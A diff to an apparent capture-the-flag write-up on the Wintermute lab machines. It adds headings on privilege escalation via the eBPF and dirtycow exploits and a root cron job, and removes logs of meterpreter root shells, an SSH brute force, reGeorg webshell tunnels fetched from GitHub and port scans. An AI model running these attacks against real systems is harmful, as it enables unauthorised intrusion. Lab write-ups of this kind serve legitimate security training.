@@ -3640,7 +3640,6 @@ sudo: no tty present and no askpass program specified
 
 
 
-
 I also exploited the Tomcat manager to upload manually a JSP Webshell and obtain access as 'ta'...
 --------------------------------------------------------------------------------------------------
 
@@ -3693,9 +3692,16 @@ ls
 > ~/.bash_history 
 exit
 
+==========================================================================================================================
+Neuromancer VM
+--------------
+Step 8. Privilege escalation to root 
+==========================================================================================================================
 
-=> Then I used my webshell to upload the script 'linux-exploit-suggester.sh'
+Method 1 - Use the eBPF exploit (CVE-2017-16995)
+-------------------------------------------------
 
+I used my webshell to upload the script 'linux-exploit-suggester.sh'
 
 # bash /home/ta/linux-exploit-suggester.sh
 
@@ -3953,6 +3959,7 @@ uid=1001(lady3jane) gid=1001(lady3jane) groups=1001(lady3jane)
 
 
 => We try now the dirtyc0w exploit just for sports
+---------------------------------------------------
 
 lady3jane@neuromancer:~$ ./dirtycow 
 /etc/passwd successfully backed up to /tmp/passwd.bak
@@ -4008,6 +4015,15 @@ sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
 
 
 ===============================================================================================
+
+Privesc to root
+---------------
+
+Method 2 - CRON misconfiguration
+-------------------------------
+=> Logged with the account 'Lady3Jane', create the script '/home/lady3jane/server-check.sh' that is launched by a CRON job with root permission
+
+
 
 msf5 post(multi/manage/autoroute) > sessions -i
 
@@ -6867,7 +6883,7 @@ drwxr-xr-x 13 root root 4096 May 18  2018 ..
 ### SCAN COMPLETE ####################################
 
 
-
+**************************************** Other tests  and notes ****************************************
 
 root@Security-Audit-01:~/Desktop/CTFs/Wintermute# hydra -v -l ta -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1 -s 34483
 Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
@@ -6885,11 +6901,8 @@ Hydra (http://www.thc.org/thc-hydra) starting at 2020-03-08 09:10:33
 
 
 ===============================================================================================
-===============================================================================================
 
-
-Let's use another pivoting technique to exploit the vulnerability for sports
---------------------------------------------------------------------------------
+Test of ther pivoting techniques to exploit the vulnerability
 
 # hostname
 straylight
@@ -6994,7 +7007,6 @@ Auxiliary action:
    Proxy  
 
 
-
 Step 3. Edit Proxychains configuration file '/etc/proxychains.conf'
 --------------------------------------------------------------------
 => gedit /etc/proxychains.conf
@@ -7024,9 +7036,6 @@ ProxyChains-3.1 (http://proxychains.sf.net)
 Connecting to 172.28.128.1:1110... |S-chain|-<>-127.0.0.1:1080-<><>-172.28.128.1:1110-<><>-OK
 connected.
 HTTP request sent, awaiting response... 
-
-
-
 
 
 Other - Using the MSF portscan module
@@ -7180,159 +7189,3 @@ root@straylight:/etc# arp -a
 ? (192.168.43.1) at 28:3f:69:c8:fc:15 [ether] on enp0s3
 Security-Audit-01 (192.168.43.32) at 08:00:27:ca:e8:b7 [ether] on enp0s3
 
-
-====================
-
-msf auxiliary(server/socks5) > run
-[*] Auxiliary module running as background job 0.
-
-[*] Starting the socks5 proxy server
-
-
-msf5 auxiliary(server/socks5) > back
-
-msf5 > sessions -i 2
-[*] Starting interaction with 2...
-
-meterpreter > shell
-Process 7546 created.
-Channel 2528 created.
-id
-uid=0(root) gid=0(root) groups=0(root),33(www-data)
-apt-get install nmap
-Reading package lists...
-Building dependency tree...
-Reading state information...
-The following packages were automatically installed and are no longer required:
-  default-mysql-server galera-3 libaio1 libcgi-fast-perl libcgi-pm-perl
-  libdbd-mysql-perl libdbi-perl libencode-locale-perl libfcgi-perl
-  libhtml-parser-perl libhtml-tagset-perl libhtml-template-perl
-  libhttp-date-perl libhttp-message-perl libio-html-perl
-  liblwp-mediatypes-perl libmariadbclient18 libreadline5 libterm-readkey-perl
-  liburi-perl mariadb-client-10.1 mariadb-client-core-10.1 mariadb-common
-  mariadb-server-10.1 mariadb-server-core-10.1 mysql-common socat
-Use 'apt autoremove' to remove them.
-The following additional packages will be installed:
-  libblas-common libblas3 libgfortran3 liblinear3 liblua5.3-0 ndiff python-bs4
-  python-chardet python-html5lib python-lxml python-pkg-resources python-six
-  python-webencodings
-Suggested packages:
-  liblinear-tools liblinear-dev python-genshi python-lxml-dbg python-lxml-doc
-  python-setuptools
-The following NEW packages will be installed:
-  libblas-common libblas3 libgfortran3 liblinear3 liblua5.3-0 ndiff nmap
-  python-bs4 python-chardet python-html5lib python-lxml python-pkg-resources
-  python-six python-webencodings
-0 upgraded, 14 newly installed, 0 to remove and 0 not upgraded.
-Need to get 7422 kB of archives.
-After this operation, 31.3 MB of additional disk space will be used.
-Do you want to continue? [Y/n] Y
-
-
-
-
-
- 
-
-I remember that 
-
-wget http://172.28.128.4:8080/struts2_2.3.15.1-showcase
-
---2020-03-07 16:56:42--  http://172.28.128.4:8080/struts2_2.3.15.1-showcase
-Connecting to 172.28.128.4:8080... connected.
-HTTP request sent, awaiting response... 302 
-Location: /struts2_2.3.15.1-showcase/ [following]
---2020-03-07 16:56:42--  http://172.28.128.4:8080/struts2_2.3.15.1-showcase/
-Reusing existing connection to 172.28.128.4:8080.
-HTTP request sent, awaiting response... 302 
-Location: showcase.action [following]
---2020-03-07 16:56:42--  http://172.28.128.4:8080/struts2_2.3.15.1-showcase/showcase.action
-Reusing existing connection to 172.28.128.4:8080.
-HTTP request sent, awaiting response... 200 
-Length: unspecified [text/html]
-Saving to: 'struts2_2.3.15.1-showcase'
-
-     0K ..........                                              139K=0.08s
-
-2020-03-07 16:56:43 (139 KB/s) - 'struts2_2.3.15.1-showcase' saved [11202]
-
-
-
-
-https://github.com/sensepost/reGeorg
-
-wget https://raw.githubusercontent.com/sensepost/reGeorg/master/tunnel.php
---2020-03-07 18:11:59--  https://raw.githubusercontent.com/sensepost/reGeorg/master/tunnel.php
-Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.120.133
-Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.120.133|:443... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 5720 (5.6K) [text/plain]
-Saving to: 'tunnel.php'
-
-     0K .....                                                 100% 3.95M=0.001s
-
-2020-03-07 18:11:59 (3.95 MB/s) - 'tunnel.php' saved [5720/5720]
-
-
-root@Security-Audit-01:~/Desktop/CTFs/Wintermute# python2 reGeorgSocksProxy.py -p 8080 -u http://192.168.1.16/turing-bolo/tunnel.php
-
-    
-                     _____
-  _____   ______  __|___  |__  ______  _____  _____   ______
- |     | |   ___||   ___|    ||   ___|/     \|     | |   ___|
- |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  |
- |__|\__\|______||______|  __||______|\_____/|__|\__\|______|
-                    |_____|
-                    ... every office needs a tool like Georg
-
-  willem@sensepost.com / @_w_m__
-  sam@sensepost.com / @trowalts
-  etienne@sensepost.com / @kamp_staaldraad
-  
-   
-[INFO   ]  Log Level set to [INFO]
-[INFO   ]  Starting socks server [127.0.0.1:8080], tunnel at [http://192.168.1.16/turing-bolo/tunnel.php]
-[INFO   ]  Checking if Georg is ready
-[INFO   ]  Georg is not ready, please check url
-
-----------------
-
-wget https://raw.githubusercontent.com/sensepost/reGeorg/master/tunnel.nosocket.php
---2020-03-07 18:11:52--  https://raw.githubusercontent.com/sensepost/reGeorg/master/tunnel.nosocket.php
-Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.120.133
-Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.120.133|:443... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 5974 (5.8K) [text/plain]
-Saving to: 'tunnel.nosocket.php'
-
-     0K .....                                                 100% 4.24M=0.001s
-
-2020-03-07 18:11:53 (4.24 MB/s) - 'tunnel.nosocket.php' saved [5974/5974]
-
-
-root@Security-Audit-01:~/Desktop/CTFs/Wintermute# python reGeorgSocksProxy.py -p 8080 -u http://192.168.1.16/turing-bolo/tunnel.nosocket.php
-
-    
-                     _____
-  _____   ______  __|___  |__  ______  _____  _____   ______
- |     | |   ___||   ___|    ||   ___|/     \|     | |   ___|
- |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  |
- |__|\__\|______||______|  __||______|\_____/|__|\__\|______|
-                    |_____|
-                    ... every office needs a tool like Georg
-
-  willem@sensepost.com / @_w_m__
-  sam@sensepost.com / @trowalts
-  etienne@sensepost.com / @kamp_staaldraad
-  
-   
-[INFO   ]  Log Level set to [INFO]
-[INFO   ]  Starting socks server [127.0.0.1:8080], tunnel at [http://192.168.1.16/turing-bolo/tunnel.nosocket.php]
-[INFO   ]  Checking if Georg is ready
-[INFO   ]  Georg says, 'All seems fine'
-
-
-root@straylight:/root# nc -znv 172.16.0.1 1-60000
-(UNKNOWN) [172.16.0.1] 34483 (?) open
-(UNKNOWN) [172.16.0.1] 8080 (http-alt) open
-(UNKNOWN) [172.16.0.1] 8009 (?) open
